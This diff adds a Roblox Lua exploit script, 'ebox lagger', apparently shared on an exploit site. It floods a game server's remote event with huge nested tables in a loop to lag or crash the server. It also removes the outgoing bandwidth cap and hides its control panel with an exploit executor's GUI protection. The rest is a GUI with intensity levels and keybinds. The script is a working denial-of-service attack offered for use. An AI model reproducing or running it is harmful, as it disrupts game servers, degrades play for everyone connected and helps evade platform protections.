@@ -1,0 +1,552 @@
+- this source dropped at cryptic sources /fpsl
+ ============================================================
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TweenSvc = game:GetService("TweenService")
+local LP = Players.LocalPlayer
+local isMobile = UIS.TouchEnabled and not UIS.MouseEnabled
+local INTENSITY_CONFIG = {
+	low = isMobile and {
+		TableIncrease = 150,
+		Tries = 1,
+		LoopWaitTime = 1.2
+	} or {
+		TableIncrease = 150,
+		Tries = 1,
+		LoopWaitTime = 0.15
+	},
+	mid = isMobile and {
+		TableIncrease = 220,
+		Tries = 1,
+		LoopWaitTime = 1.0
+	} or {
+		TableIncrease = 220,
+		Tries = 1,
+		LoopWaitTime = 0.08
+	},
+	high = isMobile and {
+		TableIncrease = 290,
+		Tries = 1,
+		LoopWaitTime = 0.85
+	} or {
+		TableIncrease = 265,
+		Tries = 1,
+		LoopWaitTime = 0.05
+	},
+}
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+local function resolveRemote(path)
+	if not path or path == "" then return nil end
+	local obj = game
+	local cleaned = path:gsub("^game%.", "")
+	for segment in cleaned:gmatch("[^%.]+") do
+		if obj then
+			obj = obj[segment]
+		else
+			return nil
+		end
+	end
+	return obj
+end
+local function getmaxvalue(val)
+	local mainvalueifonetable = 499999
+	if type(val) ~= "number" then return nil end
+	return mainvalueifonetable / (val + 2)
+end
+local function bomb(tableincrease, tries)
+	local maintable = {}
+	local spammedtable = {}
+	table.insert(spammedtable, {})
+	local z = spammedtable[1]
+	for i = 1, tableincrease do
+		local tableins = {}
+		table.insert(z, tableins)
+		z = tableins
+	end
+	local maximum = getmaxvalue(tableincrease) or 9999999
+	for i = 1, maximum do
+		table.insert(maintable, spammedtable)
+		if i % 5000 == 0 then task.wait() end
+	end
+	local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+	if remote then
+		for i = 1, tries do
+			pcall(function()
+				if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+					remote:FireServer(maintable)
+				elseif remote:IsA("RemoteFunction") then
+					remote:InvokeServer(maintable)
+				end
+			end)
+		end
+	end
+end
+local laggerEnabled = false
+local laggerThread  = nil
+local currentConfig = INTENSITY_CONFIG["high"]
+local function startLaggerLoop()
+	while laggerEnabled do
+		pcall(function()
+			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+		end)
+		task.spawn(function()
+			bomb(currentConfig.TableIncrease, currentConfig.Tries)
+		end)
+		task.wait(math.max(currentConfig.LoopWaitTime, 0.05))
+	end
+end
+local function stopLaggerLoop()
+	laggerEnabled = false
+	if laggerThread then
+		pcall(function() coroutine.close(laggerThread) end)
+		laggerThread = nil
+	end
+end
+local function startLagger()
+	if laggerThread then return end
+	laggerEnabled = true
+	laggerThread  = coroutine.create(startLaggerLoop)
+	coroutine.resume(laggerThread)
+end
+local function restartLagger()
+	stopLaggerLoop()
+	startLagger()
+end
+local State = {
+	laggerOn     = false,
+	intensity    = "high",
+	lockGui      = false,
+	settingsOpen = false,
+}
+local Binds = {
+	low  = Enum.KeyCode.Unknown,
+	mid  = Enum.KeyCode.Unknown,
+	high = Enum.KeyCode.Unknown,
+}
+for _, name in pairs({"EboxLagger", "EboxLaggerGui", "MonkeyLagger"}) do
+	pcall(function() game:GetService("CoreGui"):FindFirstChild(name):Destroy() end)
+	pcall(function() LP.PlayerGui:FindFirstChild(name):Destroy() end)
+end
+local gui = Instance.new("ScreenGui")
+gui.Name           = "EboxLagger"
+gui.ResetOnSpawn   = false
+gui.DisplayOrder   = 999
+gui.IgnoreGuiInset = true
+pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
+pcall(function() gui.Parent = game:GetService("CoreGui") end)
+if not gui.Parent then gui.Parent = LP.PlayerGui end
+local C = {
+	bg        = Color3.fromRGB(20, 20, 20),
+	header    = Color3.fromRGB(20, 20, 20),
+	border    = Color3.fromRGB(55, 55, 55),
+	text      = Color3.fromRGB(255, 255, 255),
+	textSub   = Color3.fromRGB(160, 160, 160),
+	textDim   = Color3.fromRGB(100, 100, 100),
+	pillOff   = Color3.fromRGB(60, 60, 60),
+	pillOn    = Color3.fromRGB(110, 110, 110),
+	knobCol   = Color3.fromRGB(255, 255, 255),
+	btnActive = Color3.fromRGB(240, 240, 240),
+	btnIdle   = Color3.fromRGB(38, 38, 38),
+	btnBorder = Color3.fromRGB(60, 60, 60),
+	bindBg    = Color3.fromRGB(20, 20, 20),
+	bindText  = Color3.fromRGB(200, 200, 200),
+	divider   = Color3.fromRGB(45, 45, 45),
+}
+local function mkCorner(p, r)
+	local c = Instance.new("UICorner", p)
+	c.CornerRadius = UDim.new(0, r or 8)
+	return c
+end
+local function mkStroke(p, col, th)
+	local s = Instance.new("UIStroke", p)
+	s.Color           = col or C.border
+	s.Thickness       = th or 1
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	return s
+end
+local function mkPad(p, l, r, t, b)
+	local pad = Instance.new("UIPadding", p)
+	pad.PaddingLeft   = UDim.new(0, l or 0)
+	pad.PaddingRight  = UDim.new(0, r or 0)
+	pad.PaddingTop    = UDim.new(0, t or 0)
+	pad.PaddingBottom = UDim.new(0, b or 0)
+end
+local function makeDraggable(frame, handle)
+	local src = handle or frame
+	local dragging, dragStart, startPos = false, nil, nil
+	local dragInput = nil
+	src.InputBegan:Connect(function(inp)
+		if State.lockGui then return end
+		if inp.UserInputType == Enum.UserInputType.MouseButton1
+			or inp.UserInputType == Enum.UserInputType.Touch then
+			dragging  = true
+			dragStart = inp.Position
+			startPos  = frame.Position
+			inp.Changed:Connect(function()
+				if inp.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	src.InputChanged:Connect(function(inp)
+		if inp.UserInputType == Enum.UserInputType.MouseMovement
+			or inp.UserInputType == Enum.UserInputType.Touch then
+			dragInput = inp
+		end
+	end)
+	UIS.InputChanged:Connect(function(inp)
+		if inp == dragInput and dragging and not State.lockGui then
+			local d = inp.Position - dragStart
+			frame.Position = UDim2.new(
+				startPos.X.Scale, startPos.X.Offset + d.X,
+				startPos.Y.Scale, startPos.Y.Offset + d.Y
+			)
+		end
+	end)
+end
+local function makeTogglePill(parent, isOn)
+	-- Pill track
+	local pill = Instance.new("Frame", parent)
+	pill.Size             = UDim2.new(0, 46, 0, 24)
+	pill.BackgroundColor3 = isOn and C.pillOn or C.pillOff
+	pill.BorderSizePixel  = 0
+	pill.ClipsDescendants = false
+	mkCorner(pill, 12)
+	-- White circle knob — high ZIndex so it is always on top
+	local knob = Instance.new("Frame", pill)
+	knob.Size             = UDim2.new(0, 18, 0, 18)
+	knob.Position         = isOn
+		and UDim2.new(1, -20, 0.5, -9)
+		or  UDim2.new(0,   2, 0.5, -9)
+	knob.BackgroundColor3 = C.knobCol
+	knob.BorderSizePixel  = 0
+	knob.ZIndex           = 10
+	mkCorner(knob, 9)
+	local function setVal(on)
+		TweenSvc:Create(pill, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
+			BackgroundColor3 = on and C.pillOn or C.pillOff,
+		}):Play()
+		TweenSvc:Create(knob, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
+			Position = on
+				and UDim2.new(1, -20, 0.5, -9)
+				or  UDim2.new(0,   2, 0.5, -9),
+		}):Play()
+	end
+	return pill, knob, setVal
+end
+local function getKeyName(kc)
+	if kc == nil or kc == Enum.KeyCode.Unknown then return "none" end
+	local n = kc.Name
+	if n == "Unknown"     then return "none"  end
+	if n == "LeftControl" then return "ctrl"  end
+	if n == "LeftShift"   then return "shift" end
+	if n == "Space"       then return "space" end
+	return n:lower()
+end
+local PW    = 244
+local TOP_H = 152
+local topPanel = Instance.new("Frame", gui)
+topPanel.Name             = "TopPanel"
+topPanel.Size             = UDim2.new(0, PW, 0, TOP_H)
+topPanel.Position         = UDim2.new(0, 430, 0, 330)
+topPanel.BackgroundColor3 = C.bg
+topPanel.BorderSizePixel  = 0
+mkCorner(topPanel, 10)
+mkStroke(topPanel, C.border, 1)
+makeDraggable(topPanel)
+local topHeader = Instance.new("Frame", topPanel)
+topHeader.Size             = UDim2.new(1, 0, 0, 38)
+topHeader.BackgroundColor3 = C.header
+topHeader.BorderSizePixel  = 0
+mkCorner(topHeader, 10)
+local hdrFix = Instance.new("Frame", topHeader)
+hdrFix.Size             = UDim2.new(1, 0, 0.5, 0)
+hdrFix.Position         = UDim2.new(0, 0, 0.5, 0)
+hdrFix.BackgroundColor3 = C.header
+hdrFix.BorderSizePixel  = 0
+local titleLbl = Instance.new("TextLabel", topHeader)
+titleLbl.Size               = UDim2.new(1, -90, 1, 0)
+titleLbl.Position           = UDim2.new(0, 14, 0, 0)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text               = "ebox lagger"
+titleLbl.TextColor3         = C.text
+titleLbl.Font               = Enum.Font.GothamBold
+titleLbl.TextSize           = 13
+titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
+titleLbl.ZIndex             = 2
+local statusLbl = Instance.new("TextLabel", topHeader)
+statusLbl.Size               = UDim2.new(0, 30, 1, 0)
+statusLbl.Position           = UDim2.new(1, -60, 0, 0)
+statusLbl.BackgroundTransparency = 1
+statusLbl.Text               = "off"
+statusLbl.TextColor3         = C.textDim
+statusLbl.Font               = Enum.Font.GothamBold
+statusLbl.TextSize           = 12
+statusLbl.TextXAlignment     = Enum.TextXAlignment.Right
+statusLbl.ZIndex             = 2
+local gearBtn = Instance.new("TextButton", topHeader)
+gearBtn.Size               = UDim2.new(0, 24, 0, 24)
+gearBtn.Position           = UDim2.new(1, -34, 0.5, -12)
+gearBtn.BackgroundTransparency = 1
+gearBtn.Text               = "⚙"
+gearBtn.TextColor3         = C.textSub
+gearBtn.Font               = Enum.Font.GothamBold
+gearBtn.TextSize           = 16
+gearBtn.ZIndex             = 3
+gearBtn.BorderSizePixel    = 0
+local topBody = Instance.new("Frame", topPanel)
+topBody.Size                = UDim2.new(1, 0, 1, -38)
+topBody.Position            = UDim2.new(0, 0, 0, 38)
+topBody.BackgroundTransparency = 1
+topBody.ClipsDescendants    = false
+local lagRow = Instance.new("Frame", topBody)
+lagRow.Size                = UDim2.new(1, 0, 0, 42)
+lagRow.Position            = UDim2.new(0, 0, 0, 2)
+lagRow.BackgroundTransparency = 1
+lagRow.ClipsDescendants    = false
+local lagLbl = Instance.new("TextLabel", lagRow)
+lagLbl.Size               = UDim2.new(1, -70, 1, 0)
+lagLbl.Position           = UDim2.new(0, 14, 0, 0)
+lagLbl.BackgroundTransparency = 1
+lagLbl.Text               = "lagger"
+lagLbl.TextColor3         = C.text
+lagLbl.Font               = Enum.Font.Gotham
+lagLbl.TextSize           = 14
+lagLbl.TextXAlignment     = Enum.TextXAlignment.Left
+lagLbl.ZIndex             = 3
+local lagPill, lagKnob, setLagPill = makeTogglePill(lagRow, false)
+lagPill.Position = UDim2.new(1, -60, 0.5, -12)
+lagPill.ZIndex   = 4
+local lagClickBtn = Instance.new("TextButton", lagRow)
+lagClickBtn.Size               = UDim2.new(1, 0, 1, 0)
+lagClickBtn.BackgroundTransparency = 1
+lagClickBtn.Text               = ""
+lagClickBtn.ZIndex             = 5
+lagClickBtn.BorderSizePixel    = 0
+local div1 = Instance.new("Frame", topBody)
+div1.Size             = UDim2.new(1, -28, 0, 1)
+div1.Position         = UDim2.new(0, 14, 0, 46)
+div1.BackgroundColor3 = C.divider
+div1.BorderSizePixel  = 0
+local intensityLbl = Instance.new("TextLabel", topBody)
+intensityLbl.Size               = UDim2.new(1, -28, 0, 20)
+intensityLbl.Position           = UDim2.new(0, 14, 0, 52)
+intensityLbl.BackgroundTransparency = 1
+intensityLbl.Text               = "intensity"
+intensityLbl.TextColor3         = C.textSub
+intensityLbl.Font               = Enum.Font.Gotham
+intensityLbl.TextSize           = 12
+intensityLbl.TextXAlignment     = Enum.TextXAlignment.Left
+intensityLbl.ZIndex             = 3
+local intensityRow = Instance.new("Frame", topBody)
+intensityRow.Size               = UDim2.new(1, -28, 0, 32)
+intensityRow.Position           = UDim2.new(0, 14, 0, 75)
+intensityRow.BackgroundTransparency = 1
+local intLayout = Instance.new("UIListLayout", intensityRow)
+intLayout.FillDirection = Enum.FillDirection.Horizontal
+intLayout.SortOrder     = Enum.SortOrder.LayoutOrder
+intLayout.Padding       = UDim.new(0, 4)
+local intensityBtns  = {}
+local intensityNames = {"low", "mid", "high"}
+local btnW = math.floor((PW - 28 - 8) / 3)
+for i, name in ipairs(intensityNames) do
+	local btn = Instance.new("TextButton", intensityRow)
+	btn.Size             = UDim2.new(0, btnW, 1, 0)
+	btn.BackgroundColor3 = (name == State.intensity) and C.btnActive or C.btnIdle
+	btn.BorderSizePixel  = 0
+	btn.Text             = name
+	btn.TextColor3       = (name == State.intensity) and C.bg or C.textSub
+	btn.Font             = Enum.Font.GothamBold
+	btn.TextSize         = 12
+	btn.ZIndex           = 3
+	btn.LayoutOrder      = i
+	mkCorner(btn, 6)
+	mkStroke(btn, C.btnBorder, 1)
+	intensityBtns[name] = btn
+end
+local settingsPanel = Instance.new("Frame", gui)
+settingsPanel.Name             = "SettingsPanel"
+settingsPanel.Size             = UDim2.new(0, PW, 0, 178)
+settingsPanel.Position         = UDim2.new(
+	topPanel.Position.X.Scale,
+	topPanel.Position.X.Offset,
+	topPanel.Position.Y.Scale,
+	topPanel.Position.Y.Offset + TOP_H + 8
+)
+settingsPanel.BackgroundColor3 = C.bg
+settingsPanel.BorderSizePixel  = 0
+settingsPanel.Visible          = false
+mkCorner(settingsPanel, 10)
+mkStroke(settingsPanel, C.border, 1)
+makeDraggable(settingsPanel)
+topPanel:GetPropertyChangedSignal("Position"):Connect(function()
+	settingsPanel.Position = UDim2.new(
+		topPanel.Position.X.Scale,
+		topPanel.Position.X.Offset,
+		topPanel.Position.Y.Scale,
+		topPanel.Position.Y.Offset + TOP_H + 8
+	)
+end)
+local settBody = Instance.new("Frame", settingsPanel)
+settBody.Size                = UDim2.new(1, 0, 1, 0)
+settBody.BackgroundTransparency = 1
+mkPad(settBody, 14, 14, 10, 10)
+local settList = Instance.new("UIListLayout", settBody)
+settList.SortOrder = Enum.SortOrder.LayoutOrder
+settList.Padding   = UDim.new(0, 0)
+local function makeSettRow(parent, labelText, lo)
+	local row = Instance.new("Frame", parent)
+	row.Size                = UDim2.new(1, 0, 0, 40)
+	row.BackgroundTransparency = 1
+	row.BorderSizePixel     = 0
+	row.LayoutOrder         = lo
+	row.ClipsDescendants    = false
+	local lbl = Instance.new("TextLabel", row)
+	lbl.Size               = UDim2.new(0.55, 0, 1, 0)
+	lbl.BackgroundTransparency = 1
+	lbl.Text               = labelText
+	lbl.TextColor3         = C.textSub
+	lbl.Font               = Enum.Font.Gotham
+	lbl.TextSize           = 13
+	lbl.TextXAlignment     = Enum.TextXAlignment.Left
+	return row, lbl
+end
+local lockRow, _ = makeSettRow(settBody, "lock gui", 1)
+local lockPill, lockKnob, setLockPill = makeTogglePill(lockRow, false)
+lockPill.Position = UDim2.new(1, -46, 0.5, -12)
+lockPill.ZIndex   = 4
+local lockClickBtn = Instance.new("TextButton", lockRow)
+lockClickBtn.Size               = UDim2.new(1, 0, 1, 0)
+lockClickBtn.BackgroundTransparency = 1
+lockClickBtn.Text               = ""
+lockClickBtn.ZIndex             = 5
+lockClickBtn.BorderSizePixel    = 0
+local div2 = Instance.new("Frame", settBody)
+div2.Size             = UDim2.new(1, 0, 0, 1)
+div2.BackgroundColor3 = C.divider
+div2.BorderSizePixel  = 0
+div2.LayoutOrder      = 2
+local bindRows = {}
+local function makeBindRow(labelText, bindKey, lo)
+	local row, _ = makeSettRow(settBody, labelText, lo)
+	local bindBtn = Instance.new("TextButton", row)
+	bindBtn.Size             = UDim2.new(0, 60, 0, 26)
+	bindBtn.Position         = UDim2.new(1, -60, 0.5, -13)
+	bindBtn.BackgroundColor3 = C.bindBg
+	bindBtn.BorderSizePixel  = 0
+	bindBtn.Text             = getKeyName(Binds[bindKey])
+	bindBtn.TextColor3       = C.bindText
+	bindBtn.Font             = Enum.Font.GothamBold
+	bindBtn.TextSize         = 12
+	bindBtn.ZIndex           = 3
+	mkCorner(bindBtn, 5)
+	mkStroke(bindBtn, C.border, 1)
+	local listening = false
+	local lkConn   = nil
+	local function stopListen(key)
+		listening          = false
+		if lkConn then lkConn:Disconnect(); lkConn = nil end
+		bindBtn.TextColor3 = C.bindText
+		if key ~= nil then
+			Binds[bindKey] = key
+			bindBtn.Text   = getKeyName(key)
+		else
+			bindBtn.Text   = getKeyName(Binds[bindKey])
+		end
+	end
+	bindBtn.MouseButton1Click:Connect(function()
+		if listening then stopListen(nil); return end
+		listening          = true
+		bindBtn.Text       = "..."
+		bindBtn.TextColor3 = C.text
+		lkConn = UIS.InputBegan:Connect(function(inp, gp)
+			if gp or not listening then return end
+			if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
+			if inp.KeyCode == Enum.KeyCode.Escape then stopListen(nil); return end
+			stopListen(inp.KeyCode)
+		end)
+	end)
+	bindBtn.MouseButton2Click:Connect(function()
+		listening      = false
+		if lkConn then lkConn:Disconnect(); lkConn = nil end
+		Binds[bindKey] = Enum.KeyCode.Unknown
+		bindBtn.Text   = "none"
+		bindBtn.TextColor3 = C.bindText
+	end)
+	bindRows[bindKey] = bindBtn
+	return row
+end
+makeBindRow("low bind",  "low",  3)
+makeBindRow("mid bind",  "mid",  4)
+makeBindRow("high bind", "high", 5)
+local function updateStatus()
+	if State.laggerOn then
+		statusLbl.Text       = "on"
+		statusLbl.TextColor3 = Color3.fromRGB(120, 220, 120)
+	else
+		statusLbl.Text       = "off"
+		statusLbl.TextColor3 = C.textDim
+	end
+end
+local function setIntensity(name)
+	State.intensity = name
+	currentConfig   = INTENSITY_CONFIG[name]
+	for n, btn in pairs(intensityBtns) do
+		if n == name then
+			btn.BackgroundColor3 = C.btnActive
+			btn.TextColor3       = C.bg
+		else
+			btn.BackgroundColor3 = C.btnIdle
+			btn.TextColor3       = C.textSub
+		end
+	end
+	if State.laggerOn then
+		restartLagger()
+	end
+end
+local function setLaggerState(on)
+	State.laggerOn = on
+	setLagPill(on)
+	updateStatus()
+	if on then
+		currentConfig = INTENSITY_CONFIG[State.intensity]
+		startLagger()
+	else
+		stopLaggerLoop()
+	end
+end
+lagClickBtn.MouseButton1Click:Connect(function()
+	setLaggerState(not State.laggerOn)
+end)
+for name, btn in pairs(intensityBtns) do
+	btn.MouseButton1Click:Connect(function()
+		setIntensity(name)
+	end)
+end
+lockClickBtn.MouseButton1Click:Connect(function()
+	State.lockGui = not State.lockGui
+	setLockPill(State.lockGui)
+end)
+gearBtn.MouseButton1Click:Connect(function()
+	State.settingsOpen    = not State.settingsOpen
+	settingsPanel.Visible = State.settingsOpen
+	gearBtn.TextColor3    = State.settingsOpen and C.text or C.textSub
+end)
+UIS.InputBegan:Connect(function(inp, gp)
+	if gp then return end
+	if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
+	local kc = inp.KeyCode
+	for bindName, boundKey in pairs(Binds) do
+		if boundKey ~= Enum.KeyCode.Unknown and kc == boundKey then
+			setIntensity(bindName)
+			if not State.laggerOn then
+				setLaggerState(true)
+			end
+		end
+	end
+end)
+updateStatus()
+setIntensity(State.intensity)
+print("[Ebox Lagger] Loaded we know")
